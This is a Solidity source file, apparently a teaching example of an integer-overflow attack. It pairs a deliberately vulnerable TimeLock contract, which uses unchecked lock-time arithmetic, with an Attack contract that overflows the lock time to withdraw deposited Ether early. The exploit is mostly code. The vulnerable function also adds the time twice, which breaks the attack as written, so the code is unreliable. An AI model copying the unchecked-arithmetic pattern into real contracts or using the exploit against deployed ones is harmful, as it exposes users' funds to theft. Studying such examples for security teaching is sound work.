pragma solidity ^0.7.6;
 contract TimeLock{
     mapping(address => uint) public balances;
     mapping(address => uint) public lockTime;

     function deposite() external payable{
         balances[msg.sender] += msg.value;
         //balance of the one calling the contract
         lockTime[msg.sender] = block.timestamp + 1 weeks;
         //block.timestamp is now
         //keep track of the time the fund will be locked before you can make withdrawal 
     }
     function increaselockTime(uint _time) public{
         //function to extend the lockTime
         lockTime[msg.sender] += _time; //version 1
         lockTime[msg.sender] = lockTime[msg.sender] + _time; //version 2

     }
     function withdraw() public{
         require(balances[msg.sender] > 0, "insufficient fund");
         require(block.timestamp > lockTime[msg.sender], "time has not expired"); 
        
        uint bal = balances[msg.sender]; //balance of msg.sender
        balances[msg.sender] = 0;

        (bool sent,) = msg.sender.call{value: bal}("");
        require(sent, "did not go through");
     }

 } 
    contract Attack{
        //contract to attack the TimeLock
       TimeLock timeLock;
        constructor(TimeLock _timeLock){
            timeLock = TimeLock(_timeLock);
        }
        fallback() external payable{
        }
        function attack() public payable {
            //payable as it involves the removal of funds
            timeLock.deposite{value: msg.value}();

            timeLock.increaselockTime(
                type(uint).max + 1 - timeLock.lockTime(address(this))//subtracting the already set 1week
                //this causes overflow, alter the timeLock and distort the duration of the lockTime
            );
            timeLock.withdraw();
        }
    }       



 
